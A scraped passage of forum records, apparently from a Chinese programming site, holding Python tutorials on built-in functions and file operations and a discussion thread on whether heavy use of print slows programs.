'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']\n</code></pre>\n<p>divmod(a, b)</p>\n<blockquote>\n<p>返回的是 a//b （除法取整）以及 a 对 b 的余数，返回结果类型为 tuple</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; divmod(10, 3)\n(3, 1)\n</code></pre>\n<p>enumerate(iterable, start=0)</p>\n<blockquote>\n<p>为元素生成下标</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; li = [\"a\",\"b\",\"c\"]\n &gt;&gt;&gt; for n,k in enumerate(li):\n ...  print(n,k)\n ...\n0 a\n1 b\n2 c\n</code></pre>\n<p>eval(expression, globals=None, locals=None)</p>\n<blockquote>\n<p>把一个字符串当作一个表达式去执行</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; string = \"1 + 3\"\n &gt;&gt;&gt; string\n'1 + 3'\n &gt;&gt;&gt; eval(string)\n4\n</code></pre>\n<p>exec(object[, globals[, locals]])</p>\n<blockquote>\n<p>把字符串当作 python 代码执行</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; exec(\"for n in range(5): print(n)\")\n0\n1\n2\n3\n4\n</code></pre>\n<p>filter(function, iterable)</p>\n<blockquote>\n<p>筛选过滤，循环可迭代的对象，把迭代的对象当作函数的参数，如果符合条件就返回<code>True</code>，否则就返回<code>False</code></p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; def func(x):\n ...  if x == 11 or x == 22:\n ...    return True\n ...\n &gt;&gt;&gt; ret = filter(func,[11,22,33,44])\n &gt;&gt;&gt; for n in ret:\n ...  print(n)\n ...\n11\n22\n</code></pre>\n<pre><code>&gt;&gt;&gt; list(filter((lambda x: x &gt; 0),range(-5,5)))\n[1, 2, 3, 4]\n</code></pre>\n<p>float([x])</p>\n<blockquote>\n<p>将整数和字符串转换成浮点数</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; float(\"124\")\n124.0\n &gt;&gt;&gt; float(\"123.45\")\n123.45\n &gt;&gt;&gt; float(\"-123.34\")\n-123.34\n</code></pre>\n<p>format(value[, format_spec])</p>\n<blockquote>\n<p>字符串格式化</p>\n</blockquote>\n<p>详键： <a href=\"https://blog.ansheng.me/article/python-full-stack-way-string-formatting/\" rel=\"nofollow\">https://blog.ansheng.me/article/python-full-stack-way-string-formatting/</a></p>\n<p>frozenset([iterable])</p>\n<blockquote>\n<p>frozenset 是冻结的集合，它是不可变的，存在哈希值，好处是它可以作为字典的 key ，也可以作为其它集合的元素。缺点是一旦创建便不能更改，没有 add ， remove 方法。</p>\n</blockquote>\n<p>getattr(object, name[, default])</p>\n<blockquote>\n<p>返回对象的命名属性的值，<code>name</code>必须是字符串，如果字符串是对象属性之一的名称，则结果是该属性的值。</p>\n</blockquote>\n<p>globals()</p>\n<blockquote>\n<p>获取或修改当前文件内的全局变量</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; a = \"12\"\n&gt;&gt;&gt; bsd = \"54asd\"\n&gt;&gt;&gt; globals()\n{'__doc__': None, 'a': '12', '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, 'bsd': '54asd', '__builtins__': &lt;module 'builtins' (built-in)&gt;, 'n': '__doc__', '__name__': '__main__', '__spec__': None, '__package__': None}\n</code></pre>\n<p>hasattr(object, name)</p>\n<blockquote>\n<p>参数是一个对象和一个字符串，如果字符串是对象的某个属性的名称，则结果为 True ，否则为 False 。</p>\n</blockquote>\n<p>hash(object)</p>\n<blockquote>\n<p>返回一个对象的 hash 值</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; a = \"asdadasdwqeq234sdfdf\"\n &gt;&gt;&gt; hash(a)\n5390438057823015497\n</code></pre>\n<p>help([object])</p>\n<blockquote>\n<p>查看一个类的所有详细方法，或者查看某个方法的使用详细信息</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; help(list)\nHelp on class list in module __builtin__:\n\nclass list(object)\n |  list() -&gt; new empty list\n |  list(iterable) -&gt; new list initialized from iterable's items\n |  \n |  Methods defined here:\n |  \n |  __add__(...)\n |      x.__add__(y) &lt;==&gt; x+y\n |  \n |  __contains__(...)\n |      x.__contains__(y) &lt;==&gt; y in x\n |  \n |  __delitem__(...)\n |      x.__delitem__(y) &lt;==&gt; del x[y]\n |  \n |  __delslice__(...)\n |      x.__delslice__(i, j) &lt;==&gt; del x[i:j]\n |      \n |      Use of negative indices is not supported.\n..........\n</code></pre>\n<p>hex(x)</p>\n<blockquote>\n<p>获取一个数的十六进制</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; hex(13)\n'0xd'\n</code></pre>\n<p>id(object)</p>\n<blockquote>\n<p>返回一个对象的内存地址</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; a = 123\n &gt;&gt;&gt; id(a)\n1835400816\n</code></pre>\n<p>input([prompt])</p>\n<blockquote>\n<p>交互式输入</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; name = input(\"Pless your name: \")\nPless your name: ansheng\n &gt;&gt;&gt; print(name)\nansheng\n</code></pre>\n<p>int(x, base=10)</p>\n<blockquote>\n<p>获取一个数的十进制</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; int(\"31\")\n31\n</code></pre>\n<blockquote>\n<p>也可以作为进制转换</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; int(10)\n10\n &gt;&gt;&gt; int('0b11',base=2)\n3\n &gt;&gt;&gt; int('11',base=8)\n9\n &gt;&gt;&gt; int('0xe',base=16)\n14\n</code></pre>\n<p>isinstance(object, classinfo)</p>\n<blockquote>\n<p>判断对象是否是这个类创建的</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; li = [11,22,33]\n&gt;&gt;&gt; isinstance(li,list)\nTrue\n</code></pre>\n<p>issubclass(class, classinfo)</p>\n<blockquote>\n<p>查看一个对象是否为子类</p>\n</blockquote>\n<p>iter(object[, sentinel])</p>\n<blockquote>\n<p>创建一个可迭代的对象</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; obj = iter([11,22,33,44])\n &gt;&gt;&gt; obj\n&lt;list_iterator object at 0x000002477DB25198&gt;\n &gt;&gt;&gt; for n in obj:\n ...  print(n)\n ...\n11\n22\n33\n44\n</code></pre>\n<p>len(s)</p>\n<blockquote>\n<p>查看一个对象的长度</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; url=\"ansheng.me\"\n &gt;&gt;&gt; len(url)\n10\n</code></pre>\n<p>list([iterable])</p>\n<blockquote>\n<p>创建一个数据类型为列表</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; li = list([11,22,33,44])\n &gt;&gt;&gt; li\n[11, 22, 33, 44]\n</code></pre>\n<p>locals()</p>\n<blockquote>\n<p>返回当前作用域的局部变量，以字典形式输出</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; func()\n &gt;&gt;&gt; def func():\n ...  name=\"ansheng\"\n ...  print(locals())\n ...\n &gt;&gt;&gt; func()\n{'name': 'ansheng'}\n</code></pre>\n<p>map(function, iterable,  ...)</p>\n<blockquote>\n<p>对一个序列中的每一个元素都传到函数中执行并返回</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; list(map((lambda x : x +10),[1,2,3,4]))\n[11, 12, 13, 14]\n</code></pre>\n<p>max(iterable, *[, key, default])</p>\n<p>max(arg1, arg2, *args[, key])</p>\n<blockquote>\n<p>取一个对象中的最大值</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; li = list([11,22,33,44])\n &gt;&gt;&gt; li = [11,22,33,44]\n &gt;&gt;&gt; max(li)\n44\n</code></pre>\n<p>memoryview(obj)</p>\n<blockquote>\n<p>返回对象 obj 的内存查看对象</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; import struct\n &gt;&gt;&gt; buf = struct.pack(\"i\"*12, *list(range(12)))\n &gt;&gt;&gt; x = memoryview(buf)\n &gt;&gt;&gt; y = x.cast('i', shape=[2,2,3])\n &gt;&gt;&gt; print(y.tolist())\n[[[0, 1, 2], [3, 4, 5]], [[6, 7, 8], [9, 10, 11]]]\n</code></pre>\n<p>min(iterable, *[, key, default])</p>\n<p>min(arg1, arg2, *args[, key])</p>\n<blockquote>\n<p>取一个对象中的最小值</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; li = list([11,22,33,44])\n &gt;&gt;&gt; li = [11,22,33,44]\n &gt;&gt;&gt; min(li)\n11\n</code></pre>\n<p>next(iterator[, default])</p>\n<blockquote>\n<p>每次只拿取可迭代对象的一个元素</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; obj = iter([11,22,33,44])\n &gt;&gt;&gt; next(obj)\n11\n &gt;&gt;&gt; next(obj)\n22\n &gt;&gt;&gt; next(obj)\n33\n &gt;&gt;&gt; next(obj)\n44\n &gt;&gt;&gt; next(obj)\n # 如果没有可迭代的元素了就会报错\nTraceback (most recent call last):\n  File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;\nStopIteration\n</code></pre>\n<p>object</p>\n<blockquote>\n<p>返回一个新的无特征对象</p>\n</blockquote>\n<p>oct(x)</p>\n<blockquote>\n<p>获取一个字符串的八进制</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; oct(13)\n'0o15'\n</code></pre>\n<p>open(file, mode='r', buffering=-1, encoding=None, errors=None, newline=None, closefd=True, opener=None)</p>\n<blockquote>\n<p>文件操作的函数，用来做文件操作的</p>\n</blockquote>\n<pre><code> # 打开一个文件\n- &gt;&gt;&gt; f = open(\"a.txt\",\"r\")\n</code></pre>\n<p>ord(c)</p>\n<blockquote>\n<p>把一个字母转换为 ASCII 对对应表中的数字</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; ord(\"a\")\n97\n &gt;&gt;&gt; ord(\"t\")\n116\n</code></pre>\n<p>pow(x, y[, z])</p>\n<blockquote>\n<p>返回一个数的 N 次方</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; pow(2, 10)\n1024\n &gt;&gt;&gt; pow(2, 20)\n1048576\n</code></pre>\n<p>print(*objects, sep=' ', end='\\n', file=sys.stdout, flush=False)</p>\n<blockquote>\n<p>打印输出</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; print(\"hello word\")\nhello word\n</code></pre>\n<p>property(fget=None, fset=None, fdel=None, doc=None)</p>\n<p>range(start, stop[, step])</p>\n<blockquote>\n<p>生成一个序列</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; range(10)\nrange(0, 10)\n &gt;&gt;&gt; for n in range(5):\n ...  print(n)\n ...\n0\n1\n2\n3\n4\n</code></pre>\n<p>repr(object)</p>\n<blockquote>\n<p>返回一个包含对象的可打印表示的字符串</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; repr(111)\n'111'\n&gt;&gt;&gt; repr(111.11)\n'111.11'\n</code></pre>\n<p>reversed(seq)</p>\n<blockquote>\n<p>对一个对象的元素进行反转</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; li = [1, 2, 3, 4]\n &gt;&gt;&gt; reversed(li)\n&lt;list_reverseiterator object at 0x000002CF0EF6A940&gt;\n &gt;&gt;&gt; for n in reversed(li):\n ...  print(n)\n ...\n4\n3\n2\n1\n</code></pre>\n<p>round(number[, ndigits])</p>\n<blockquote>\n<p>四舍五入</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; round(3.3)\n3\n &gt;&gt;&gt; round(3.7)\n4\n</code></pre>\n<p>set([iterable])</p>\n<blockquote>\n<p>创建一个数据类型为集合</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; varss = set([11,222,333])\n &gt;&gt;&gt; type(varss)\n&lt;class 'set'&gt;\n</code></pre>\n<p>setattr(object, name, value)</p>\n<blockquote>\n<p>为某个对象设置一个属性</p>\n</blockquote>\n<p>slice(start, stop[, step])</p>\n<blockquote>\n<p>元素的切片操作都是调用的这个方法</p>\n</blockquote>\n<p>sorted(iterable[, key][, reverse])</p>\n<blockquote>\n<p>为一个对象的元素进行排序</p>\n</blockquote>\n<p>代码：</p>\n<pre><code>#!/usr/bin/env python\n# _*_ coding:utf-8 _*_\n\nchar=['赵',\"123\", \"1\", \"25\", \"65\",\"679999999999\", \"a\",\"B\",\"alex\",\"c\" ,\"A\", \"_\", \"ᒲ\",'a 钱','孙','李',\"余\", '佘',\"佗\", \"㽙\", \"铱\", \"钲钲㽙㽙㽙\"]\n\nnew_chat = sorted(char)\nprint(new_chat)\nfor i in new_chat:\n    print(bytes(i, encoding='utf-8'))\n</code></pre>\n<p>输出结果：</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/Note/soretd.py\n['1', '123', '25', '65', '679999999999', 'A', 'B', '_', 'a', 'alex', 'a 钱', 'c', 'ᒲ', '㽙', '佗', '佘', '余', '孙', '李', '赵', '钲钲㽙㽙㽙', '铱']\nb'1'\nb'123'\nb'25'\nb'65'\nb'679999999999'\nb'A'\nb'B'\nb'_'\nb'a'\nb'alex'\nb'a\\xe9\\x92\\xb1'\nb'c'\nb'\\xe1\\x92\\xb2'\nb'\\xe3\\xbd\\x99'\nb'\\xe4\\xbd\\x97'\nb'\\xe4\\xbd\\x98'\nb'\\xe4\\xbd\\x99'\nb'\\xe5\\xad\\x99'\nb'\\xe6\\x9d\\x8e'\nb'\\xe8\\xb5\\xb5'\nb'\\xe9\\x92\\xb2\\xe9\\x92\\xb2\\xe3\\xbd\\x99\\xe3\\xbd\\x99\\xe3\\xbd\\x99'\nb'\\xe9\\x93\\xb1'\n\nProcess finished with exit code 0\n</code></pre>\n<p>staticmethod(function)</p>\n<blockquote>\n<p>返回函数的静态方法</p>\n</blockquote>\n<p>str(object=b'', encoding='utf-8', errors='strict')</p>\n<blockquote>\n<p>字符串</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; a = str(111)\n &gt;&gt;&gt; type(a)\n&lt;class 'str'&gt;\n</code></pre>\n<p>sum(iterable[, start])</p>\n<blockquote>\n<p>求和</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; sum([11,22,33])\n66\n</code></pre>\n<p>super([type[, object-or-type]])</p>\n<blockquote>\n<p>执行父类的构造方法</p>\n</blockquote>\n<p>tuple([iterable])</p>\n<blockquote>\n<p>创建一个对象，数据类型为元组</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; tup = tuple([11,22,33,44])\n&gt;&gt;&gt; type(tup)\n&lt;class 'tuple'&gt;\n</code></pre>\n<p>type(object)</p>\n<blockquote>\n<p>查看一个对象的数据类型</p>\n</blockquote>\n<pre><code> &gt;&gt;&gt; a = 1\n &gt;&gt;&gt; type(a)\n&lt;class 'int'&gt;\n &gt;&gt;&gt; a = \"str\"\n &gt;&gt;&gt; type(a)\n&lt;class 'str'&gt;\n</code></pre>\n<p>vars([object])</p>\n<p>查看一个对象里面有多少个变量</p>\n<p>zip(*iterables)</p>\n<blockquote>\n<p>将两个元素相同的序列转换为字典</p>\n</blockquote>\n<pre><code>&gt;&gt;&gt; li1 = [\"k1\",\"k2\",\"k3\"]\n&gt;&gt;&gt; li2 = [\"a\",\"b\",\"c\"]\n&gt;&gt;&gt; d = dict(zip(li1,li2))\n&gt;&gt;&gt; d\n{'k1': 'a', 'k2': 'b', 'k3': 'c'}\n</code></pre>\n<p>__import__(name, globals=None, locals=None, fromlist=(), level=0)</p>\n<blockquote>\n<p>导入模块，把导入的模块作为一个别名</p>\n</blockquote>\n<h2>生成随机验证码例子</h2>\n<p>生成一个六位的随机验证码，且包含数字，数字的位置随机</p>\n<pre><code># 导入 random 模块\nimport random\ntemp = \"\"\nfor i in range(6):\n    num = random.randrange(0,4)\n    if num == 3 or num == 1:\n        rad2 = random.randrange(0,10)\n        temp = temp + str(rad2)\n    else:\n        rad1 = random.randrange(65,91)\n        c1 = chr(rad1)\n        temp = temp + c1\nprint(temp)\n</code></pre>\n<p>输出结果</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/Day06/built_in.py\n72TD11\n</code></pre>\n<hr>\n<p><a href=\"https://blog.ansheng.me/article/python-full-stack-way-built-in-functions/\" rel=\"nofollow\">原文链接</a></p>\n</div></div>"], "reply": "1", "tittle": "Python 全栈之路系列之 Python3 内置函数", "comment": ["nice mark"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Python 可以对文件进行查看、创建等功能，可以对文件内容进行添加、修改、删除，且所使用到的函数在 Python3.5.x 为<code>open</code>，在 Python2.7.x 同时支持<code>file</code>和<code>open</code>，但是在 3.5.x 系列移除了<code>file</code>函数。</p>\n<h2>Python 文件打开方式</h2>\n<pre><code>文件句柄 = open('文件路径','打开模式')\n</code></pre>\n<blockquote>\n<p><strong>Ps ：</strong>文件句柄相当于于变量名，文件路径可以写为绝对路径也可以写为相对路径。</p>\n</blockquote>\n<h2>Python 打开文件的模式</h2>\n<p>基本的模式</p>\n<p>|模式|说明|注意事项|\n|:--:|:--|:--|\n|r|只读模式|文件必须存在|\n|w|只写模式|文件不存在则创建文件，文件存在则清空文件内容|\n|x|只写模式|文件不可读，文件不存在则创建，存在则报错|\n|a|追加模式|文件不存在创建文件，文件存在则在文件末尾添加内容|</p>\n<p>带<code>+</code>的模式</p>\n<p>|模式|说明|\n|:--:|:--|\n|r+|读写|\n|w+|写读|\n|x+|写读|\n|a+|写读|</p>\n<p>带<code>b</code>的模式</p>\n<p>|模式|说明|\n|:--:|:--|\n|rb|二进制读模式|\n|wb|二进制写模式|\n|xb|二进制只写模式|\n|ab|二进制追加模式|</p>\n<blockquote>\n<p><strong>提示：</strong>以 b 方式打开时，读取到的内容是字节类型，写入时也需要提供字节类型</p>\n</blockquote>\n<p>带<code>+</code>带<code>b</code>的模式</p>\n<p>|模式|说明|\n|:--:|:--|\n|rb+|二进制读写模式|\n|wb+|二进制读写模式|\n|xb+|二进制只写模式|\n|ab+|二进制读写模式|</p>\n<h2>Python 文件读取方式</h2>\n<p>|模式|说明|\n|:--|:--|\n|read([size])|读取文件全部内容，如果设置了 size ，那么久读取 size 字节|\n|readline([size])|一行一行的读取|\n|readlines()|读取到的每一行内容作为列表中的一个元素|</p>\n<p>测试的文件名是<code>hello.tx\"</code>，文件内容为：</p>\n<pre><code>Hello Word!\n123\nabc\n456\nabc\n789\nabc\n</code></pre>\n<p><strong>read</strong></p>\n<p>代码：</p>\n<pre><code># 以只读的方式打开文件 hello.txt\nf = open(\"hello.txt\",\"r\")\n# 读取文件内容赋值给变量 c\nc = f.read()\n# 关闭文件\nf.close()\n# 输出 c 的值\nprint(c)\n</code></pre>\n<p>输出结果：</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/Day06/file.py\nHello Word!\n123\nabc\n456\nabc\n789\nabc\n</code></pre>\n<p><strong>readline</strong></p>\n<p>代码：</p>\n<pre><code># 以只读模式打开文件 hello.txt\nf = open(\"hello.txt\",\"r\")\n# 读取第一行\nc1 = f.readline()\n# 读取第二行\nc2 = f.readline()\n# 读取第三行\nc3 = f.readline()\n# 关闭文件\nf.close()\n# 输出读取文件第一行内容\nprint(c1)\n# 输出读取文件第二行内容\nprint(c2)\n# 输出读取文件第三行内容\nprint(c3)\n</code></pre>\n<p>输出结果：</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/Day06/file.py\nHello Word!\n\n123\n\nabc\n</code></pre>\n<p><strong>readlines</strong></p>\n<pre><code># 以只读的方式打开文件 hello.txt\nf = open(\"hello.txt\",\"r\")\n# 将文件所有内容赋值给 c\nc = f.readlines()\n# 查看数据类型\nprint(type(c))\n# 关闭文件\nf.close()\n# 遍历输出文件内容\nfor n in c:\n    print(n)\n</code></pre>\n<p>结果</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/Day06/file.py\n# 输出的数据类型\n&lt;class 'list'&gt;\nHello Word!\n\n123\n\nabc\n\n456\n\nabc\n\n789\n\nabc\n</code></pre>\n<h2>Python 文件写入方式</h2>\n<p>|方法|说明|\n|:--|:--|\n|write(str)|将字符串写入文件|\n|writelines(sequence or strings)|写多行到文件，参数可以是一个可迭代的对象，列表、元组等|</p>\n<p><strong>write</strong></p>\n<p>代码：</p>\n<pre><code># 以只读的模式打开文件 write.txt ，没有则创建，有则覆盖内容\nfile = open(\"write.txt\",\"w\")\n# 在文件内容中写入字符串 test write\nfile.write(\"test write\")\n# 关闭文件\nfile.close()\n</code></pre>\n<p><code>write.txt</code>文件内容为：</p>\n<pre><code>test write\n</code></pre>\n<p><strong>writelines</strong></p>\n<p>代码：</p>\n<pre><code># 以只读模式打开一个不存在的文件 wr_lines.txt\nf = open(\"wr_lines.txt\",\"w\",encoding=\"utf-8\")\n# 写入一个列表\nf.writelines([\"11\",\"22\",\"33\"])\n# 关闭文件\nf.close()\n</code></pre>\n<p><code>wr_lines.txt</code>文件内容：</p>\n<pre><code>112233\n</code></pre>\n<h2>Python 文件操作所提供的方法</h2>\n<p><strong>close(self):</strong></p>\n<p>关闭已经打开的文件</p>\n<pre><code>f.close()\n</code></pre>\n<p><strong>fileno(self):</strong></p>\n<p>文件描述符</p>\n<pre><code> f = open(\"hello.txt\",\"r\")\nret = f.fileno()\nf.close()\nprint(ret)\n</code></pre>\n<p>执行结果：</p>\n<pre><code>3\n</code></pre>\n<p><strong>flush(self):</strong></p>\n<p>刷新缓冲区的内容到硬盘中</p>\n<pre><code>f.flush()\n</code></pre>\n<p><strong>isatty(self):</strong></p>\n<p>判断文件是否是 tty 设备，如果是 tty 设备则返回<code>True</code>，否则返回<code>False</code></p>\n<pre><code>f = open(\"hello.txt\",\"r\")\nret = f.isatty()\nf.close()\nprint(ret)\n</code></pre>\n<p>返回结果：</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/Day06/file.py\nFalse\n</code></pre>\n<p><strong>readable(self):</strong></p>\n<p>是否可读，如果可读返回<code>True</code>，否则返回<code>False</code></p>\n<pre><code>f = open(\"hello.txt\",\"r\")\nret = f.readable()\nf.close()\nprint(ret)\n</code></pre>\n<p>返回结果：</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/Day06/file.py\nTrue\n</code></pre>\n<p><strong>readline(self, limit=-1):</strong></p>\n<p>每次仅读取一行数据</p>\n<pre><code>f = open(\"hello.txt\",\"r\")\nprint(f.readline())\nprint(f.readline())\nf.close()\n</code></pre>\n<p>返回结果：</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/Day06/file.py\nHello Word!\n\n123\n</code></pre>\n<p><strong>readlines(self, hint=-1):</strong></p>\n<p>把每一行内容当作列表中的一个元素</p>\n<pre><code>f = open(\"hello.txt\",\"r\")\nprint(f.readlines())\nf.close()\n</code></pre>\n<p>返回结果：</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/Day06/file.py\n['Hello Word!\\n', '123\\n', 'abc\\n', '456\\n', 'abc\\n', '789\\n', 'abc']\n</code></pre>\n<ul>\n<li>tell(self):</li>\n</ul>\n<p>获取指针位置</p>\n<pre><code>f = open(\"hello.txt\",\"r\")\nprint(f.tell())\nf.close()\n</code></pre>\n<p>返回结果:</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/Day06/file.py\n0\n</code></pre>\n<p><strong>seek(self, offset, whence=io.SEEK_SET):</strong></p>\n<p>指定文件中指针位置</p>\n<pre><code>f = open(\"hello.txt\",\"r\")\nprint(f.tell())\nf.seek(3)\nprint(f.tell())\nf.close()\n</code></pre>\n<p>执行结果</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/Day06/file.py\n0\n3\n</code></pre>\n<p><strong>seekable(self):</strong></p>\n<p>指针是否可操作</p>\n<pre><code>f = open(\"hello.txt\",\"r\")\nprint(f.seekable())\nf.close()\n</code></pre>\n<p>执行结果</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/Day06/file.py\nTrue\n</code></pre>\n<p><strong>writable(self):</strong></p>\n<p>是否可写</p>\n<pre><code>f = open(\"hello.txt\",\"r\")\nprint(f.writable())\nf.close()\n</code></pre>\n<p>执行结果</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/Day06/file.py\nFalse\n</code></pre>\n<p><strong>writelines(self, lines):</strong></p>\n<p>写入文件的字符串序列，序列可以是任何迭代的对象字符串生产，通常是一个<code>字符串列表</code>。</p>\n<pre><code>f = open(\"wr_lines.txt\",\"w\")\nf.writelines([\"11\",\"22\",\"33\"])\nf.close()\n</code></pre>\n<p>执行结果</p>\n<pre><code>112233\n</code></pre>\n<p><strong>read(self, n=None):</strong></p>\n<p>读取指定字节数据，后面不加参数默认读取全部</p>\n<pre><code>f = open(\"wr_lines.txt\",\"r\")\nprint(f.read(3))\nf.seek(0)\nprint(f.read())\nf.close()\n</code></pre>\n<p>执行结果</p>\n<pre><code>C:\\Python35\\python.exe F:/Python_code/sublime/Day06/file.py\n112\n112233\n</code></pre>\n<p><strong>write(self, s):</strong></p>\n<p>往文件里面写内容</p>\n<pre><code>f = open(\"wr_lines.txt\",\"w\")\nf.write(\"abcabcabc\")\nf.close()\n</code></pre>\n<p>文件内容</p>\n<pre><code>abcabcabc\n</code></pre>\n<h2>同时打开多个文件</h2>\n<p>为了避免打开文件后忘记关闭，可以通过管理上下文，即：</p>\n<pre><code>with open('log','r') as f:\n 代码块\n</code></pre>\n<p>如此方式，当 with 代码块执行完毕时，内部会自动关闭并释放文件资源。</p>\n<p>在 Python 2.7 及以后， with 又支持同时对多个文件的上下文进行管理，即：</p>\n<pre><code>with open('log1') as obj1, open('log2') as obj2:\n    pass\n</code></pre>\n<hr>\n<p><a href=\"https://blog.ansheng.me/article/python-full-stack-way-file-operations/\" rel=\"nofollow\">原文链接</a></p>\n</div></div>"], "reply": "1", "tittle": "Python 全栈之路系列之文件操作", "comment": ["为什么要把官网的教程再发一遍"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有的 Java 编程规范禁止使用 print 强制让用 logger 代替</p>\n<p>不知道 python 是不是也一样的</p>\n</div></div>"], "reply": "33", "tittle": "Python 中大量使用 print 会影响性能吗？", "comment": ["io 会影响性能的，但是使用 log 是为了更方便管理吧。。", "我就怕 println 是同步阻塞 而且没有缓存，来一个请求发一次", "缓存是不可能的\r", "有缓冲", "print 好像是会同步阻塞的吧  ", "感觉最能体现这一点的应该在网络延时高的情况下 ssh 进服务器跑 py 的时候，由于输出耗时长所以带大量 print 的方法的执行速度肯定会拖累下来", " 我想的应该就是缓冲 尴尬。。", "会的", "io 本来速度就很慢，但是请问下使用 log 会比直接 print 快吗难道？", " 看你用哪种了，如果把 log 放到 redis 里用 pub,sub 来实现会好很多。", "当然会，所以不到关键时刻，不要随便 print ，虽然 print 性能下降到原来几分之一很正常。", "会严重影响性能~", "如果并发高,logger 就少点咯，然而我没有并发", " log 框架有异步的，减少 IO 次数，提高效率", ">/dev/null 就不会太影响性能。", "不懂 Python,不过原理差不多吧\r", "虽然 print 和 logger 都一样是 io consume 的,不过很多 logger 是基于 ringbuffer 做的异步输出\r", "另外还有线程安全的问题,Python 的 print 也是线程不安全的,你有加锁么......\r", "另外如果用 print,你要把日志打印到文件,如果没有用第三方 log rotate 工具,日志会堆积...\r", "堆积到磁盘满了,你想删除日志文件,还要等所有持有 inode 的进程都停掉文件才能被删除,不停止进程还没法清空磁盘", "首先，你要有这样一个高并发的程序。", " 本质上应该还是把数组先保存在内存，之后在写入到磁盘吧？", " 不能这样，会有内存溢出的风险", "两个耗时应该一样吧，如果是高并发，肯定 logger 好", " 为什么你的回复没有提醒？", "log 有不同级别，可以关闭，可以替换内部实现， print 就很难拓展了", "我觉得“大量使用 print ”会影响性能。因为“ print ”本来就是慢的（属于 IO ），我*猜测*它比写文件还要慢，所以会拖慢速度。", "……\r", "print 是往标准输出写数据，在 python 上应该是有缓冲\r", "写日志一般调用的也是有缓冲的方法，同时写日志模块自己也会设计缓冲\r", "你可以都理解成写文件\r", "但是你都往一个文件里写的时候，并发高到阻塞就成为一个问题。\r", "标准输出只有一个，文件可以有很多，但是磁盘的读写速度也是有限的。\r", "——————————————\r", "所以，你要考虑你程序的性质\r", "一个简单的展示用 print 没什么问题\r", "如果输出太快你看不过来，可能那时候还没触及你所谓的性能瓶颈，可能那时候瓶颈是人眼\r", "如果你的程序是高并发程序，即使不触及瓶颈，你能保证看到所有你想要的输出吗？能保证以后查找问题的时候使用吗？", "这么给你说吧：\r", "```python\r", "a = 2**999999999999\r", "```\r", "这一行代码不到一秒钟就可以计算完毕。\r", "但是如果你加上一行\r", "print(a)\r", "\r", "那么你需要等几个小时才能看到有东西显示出来。", "io 流很影响性能、、、", " 对。一般放到队列里。", " 等了十分钟也没计算完毕。。。", "不能推荐大量使用的原因之一是非线程安全的", " \r", "a = 2**9999999", "我来说一个我前一段时间遇到的迷之 BUG 。\r", "是一个 Django 的项目，还在开发阶段。之前一直在本地开发，那段时间把项目部署到测试服务器上。\r", "我使用 django 自带的 web 服务器，用  `(manage.py runserver 0.0.0.0:8000 > /dev/null &)` 来执行。\r", "我访问我本地的网站，一直都正常。但访问服务器上的网站，有一些特定的页面， HTTP 请求始终不会结束。表现为网页能打开，但浏览器的小圈圈一直不会停。使用 curl 请求，能立刻获得页面完整内容，但脚本必须要等到超时才能结束。使用 ajax 调用，因为 http response 一直不结束，所以 ajax 成功的回调也无法执行，直到 http 超时才能得到一个 timeout 的错误。\r", "我整理了问题出现的各种条件，直到我发现，只要我不关终端，问题就不会出现，关闭了终端，问题才有可能出现。我这才恍然大悟。\r", "> 